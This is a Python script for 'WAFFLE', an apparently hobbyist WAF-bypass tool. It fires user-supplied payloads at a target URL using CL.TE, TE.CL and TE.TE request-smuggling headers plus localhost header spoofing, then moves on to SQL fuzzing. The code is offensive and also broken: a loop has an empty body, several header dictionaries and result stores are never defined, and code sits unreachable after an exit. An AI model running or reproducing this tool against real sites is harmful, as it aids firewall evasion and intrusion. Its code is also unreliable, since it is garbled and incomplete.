# Python-scripted WAF Bypass
# ♥ anxiety#1101 @ Datura Data ♥

# Python 3.9.6
# UTF-8


# Imports
import argparse
from os import system, name
import requests
from lib import parser
import time


# Clear Screen
def clear():
    # Windows
    if name == 'nt':
        _ = system('cls')

    # Mac/Linux
    else:
        _ = system('clear')


# Banner
banner = '''

                          .-.       .-.      ___
                         /    \\    /    \\   (   )
 ___  ___  ___   .---.   | .`. ;   | .`. ;   | |    .--.
(   )(   )(   ) / .-, \\  | |(___)  | |(___)  | |   /    \\
 | |  | |  | | (__) ; |  | |_      | |_      | |  |  .-. ;
 | |  | |  | |   .'`  | (   __)   (   __)    | |  |  | | |
 | |  | |  | |  / .'| |  | |       | |       | |  |  |/  |
 | |  | |  | | | /  | |  | |       | |       | |  |  ' _.'
 | |  ; '  | | ; |  ; |  | |       | |       | |  |  .'.-.
 ' `-'   `-' ' ' `-'  |  | |       | |       | |  '  `-' /
  '.__.'.__.'  `.__.'_. (___)     (___)     (___)  `.__.' ♥
  
 '''

# Argument Parsing
parser = argparse.ArgumentParser(prog='WAFFLE', description=banner,
                                 epilog=' [ WAFFLE ♥ | WAF-Bypass Testing Tool | anxiety ♥ ] ',
                                 prefix_chars='--')
parser.add_argument('--url', metavar='Target URL', type=str,
                    help=' [ REQUIRED | Target URL in format: $ python3 WAFFLE.py < https://www.example.com/ > ] ')
parser.add_argument('--payload', metavar='Payload', type=str,
                    help='[ REQUIRED | Payload to test against WAF filter: $ python3 WAFFLE.py < --Target URL > < -- '
                         'Payload > ] ')
args = parser.parse_args()

url = args.url
payload = args.payload

# Payload --> Byte Size (for header tampering)
payloadBytes = len(payload)

# Payload Byte Size Adapted to Request

# Example POST Request -

# POST / HTTP/1.1
# Host: vulnerable-website.com
# Content-Length: 13
# Transfer-Encoding: chunked
#
# 0

# < Payload Here >

# Explanation:
# Lines 66-68 (Given ln68 is blank) consist of five bytes of data
# Take the length of 'payload' variable and add five bytes for the total byte size
# Adapted to the smuggled POST request format.
payloadBytes_adapted: int = payloadBytes + 5

# Checking for required arguments & valid URL
if url is None or payload is None:
    print("[ ! | MISSING ARGUMENTS ] One or more required arguments missing.\nFor usage instructions, use argument -h "
          "or --help.\n\n")
    time.sleep(1)
    print(" Example:\n$ python3 waffle.py -h ")
    time.sleep(5)
    exit()

if requests.get(url).status_code != 200:
    clear()
    print(" [ WAFFLE | Python-scripted WAF-Bypass | vipa@DaturaData ♥ ] \n\n\n")
    print("[ !! | Invalid URL ] Status code: {0}".format(str(requests.get(url).status_code)))
    time.sleep(1)
    print("\n\n Please enter a valid URL.\nExiting...")
    time.sleep(4)
    exit()

    # Payload --> Byte Size (for header tampering)
    payloadBytes = len(payload)

    # Payload Byte Size Adapted to Request
    payloadBytes_adapted = payloadBytes + 5

    # Explanation & Example POST Request -

    # POST / HTTP/1.1
    # Host: vulnerable-website.com
    # Content-Length: 13
    # Transfer-Encoding: chunked
    #
    # 0

    # < Payload Here >

    # Explanation:
    # Lines 66-68 (Given ln68 is blank) consist of five bytes of data
    # Take the length of 'payload' variable and add five bytes for the total byte size
    # Adapted to the smuggled POST request format.

    # Try Header Spoofing -> Header Smuggling ( CL.TE [Complete] -> TE.CL [To-Do] -> TE.TE [To-Do] )  -> Header Spoofing + Header Smuggling
    # If request is valid, store and return valid bypass methods & data


# Function | Main
class run:
    def sql_fuzz(self, parser):
        for METHOD_SQL in parser:

    def main(self):
        print(banner)
        print("\n [ WAFFLE | Python-scripted WAF-Bypass | anxiety#1101 ♥ | Datura Data ♥ ] \n\n\n")
        time.sleep(2)
        print("\r\rAnalyzing...\r\r")

        # Headers | CL.TE
        clte_response = requests.post(url, data=payload, headers=clte_headers)
        clte_status = clte_response.status_code
        if clte_status == 200:
            print("[!] Response Status Code: 200\n\n" + " [ ✓ || VALID | HEADERS ] CL.TE Smuggling ")
            valid.update({"[ ✓ || VALID | HEADERS ] CL.TE": str(clte_response)})
        else:
            print(" [ ✕ || INVALID | HEADERS ] CL.TE Smuggling ")
            invalid.update({"[ ✕ || INVALID | HEADERS ] CL.TE": str(clte_response)})

        # Headers | TE.CL Smuggling
        tecl_response = requests.post(url, headers={
            "Content-Length": str(payloadBytes_adapted),
            "Transfer-Encoding": "chunked"
        }, data=payload)
        tecl_status = tecl_response.status_code

        if tecl_status == 200:
            print("[!] Response Status Code: 200\n\n" + " [✓ || VALID | HEADERS ] TE.CL Smuggling")
            valid.update({"[ ✓ || VALID | HEADERS ] TE.CL": str(tecl_response)})
        else:
            print(" [ ✕ || INVALID | HEADERS] TE.CL Smuggling")
            invalid.update({"[ ✕ || INVALID | HEADERS ] TE.CL": str(tecl_response)})

        # Headers | TE.TE Smuggling | TODO
        for lines in tete_variation:
            a = 0
            while a <= 28:
                a += 1
                print("[ TE.TE | TRY : ", a, " ]")
                tete_response = requests.post(url, headers=tete_headers.update(a), data=payload)
                tete_status = tete_response.status_code
                if tete_status == 200:
                    print(" [!] Response Status Code: 200\n\n" + " [ ✓ || VALID | HEADERS ] TE.TE Smuggling & Spoofing")
                    valid.update({"[ ✓ || VALID | HEADERS ] CL.TE & Spoofing": str(tete_response)})
                else:
                    print(" [ ✕ || INVALID | HEADERS ] TE.TE Smuggling & Spoofing")
                    invalid.update({"[ ✕ || INVALID | HEADERS ] TE.TE & Spoofing": str(tete_response)})

        # Headers | CL.TE Smuggling & Localhost-Spoofing
        lhclte_headers = spoof_headers.update(clte_headers)
        lhclte_response = requests.post(url, data=payload, headers=lhclte_headers)
        lhclte_status = lhclte_response.status_code
        if 200 == lhclte_status:
            print(" [!] Response Status Code: 200\n\n" + " [ ✓ || VALID | HEADERS ] CL.TE Smuggling & Spoofing")
            valid.update({"[ ✓ || VALID | HEADERS ] CL.TE & Spoofing": str(lhclte_response)})
        else:
            print(" [ ✕ || INVALID | HEADERS ] CL.TE Smuggling & Spoofing")
            invalid.update({"[ ✕ || INVALID | HEADERS ] CL.TE & Spoofing": str(lhclte_response)})

        # Headers | TE.CL Smuggling & Localhost-Spoofing

        lhtecl_headers = spoof_headers.update(tecl_headers)
        lhtecl_response = requests.get(url, headers=lhtecl_headers, data=payload)
        lhtecl_status = lhtecl_response.status_code
        if lhtecl_status == 200:
            print(" [!] Response Code: 200\n\n" + " [ ✓ || VALID | HEADERS ] TE.CL Smuggling & Spoofing")
            valid.update({"[ ✓ || VALID | HEADERS ] TE.CL & Spoofing": str(lhtecl_response)})
        else:
            print(" [ ✕ || INVALID | HEADERS ] CL.TE Smuggling & Spoofing")
            invalid.update({"[ ✕ || INVALID | HEADERS ] TE.CL & Spoofing": str(lhtecl_response)})

        # Headers | TE.TE Smuggling & Localhost-Spoofing | TODO
        for i in tete_variation:
            a += 1
            print("[ TE.TE & Localhost Spoofing | TRY : ", a, " ]")
            lhtete_headers = spoof_headers.update(i)
            lhtete_response = requests.get(url, headers=lhtete_headers, data=payload)
            if lhtete_response.status_code == 200:
                print(" [!] Response Status Code: 200\n\n [ ✓ || VALID | HEADERS ] TE.TE Smuggling & Spoofing")
                valid.update({"[ ✓ || VALID | HEADERS ] CL.TE & Spoofing": str(lhtete_response)})
            else:
                print(" [ ✕ || INVALID | HEADERS ] TE.TE Smuggling & Spoofing")
                invalid.update({"[ ✕ || INVALID | HEADERS ] TE.TE & Spoofing": str(lhtete_response)})

        # If | Invalid | All Header Manipulation Tactics
        if clte_status != 200 and tecl_status != 200 and lhclte_status != 200 and lhtecl_status != 200 and tete_response != 200:
            time.sleep(3.5)
            print('\n[✕ | Header manipulation ineffective, continuing attack methods...')
            sql_fuzz(self)





# Initializing WAFFLE.py - HOME
print(banner + "\n\n\n")
print(" [ ♥ WAFFLE ♥ | WAF-Bypass Testing Tool | anxiety#1101 @ Datura Data ♥ ] ")
time.sleep(1)
print(" For usage instructions, use arguments: $ python3 WAFFLE.py < --help or -h > ")
time.sleep(3)
clear()

run.main()
exit()
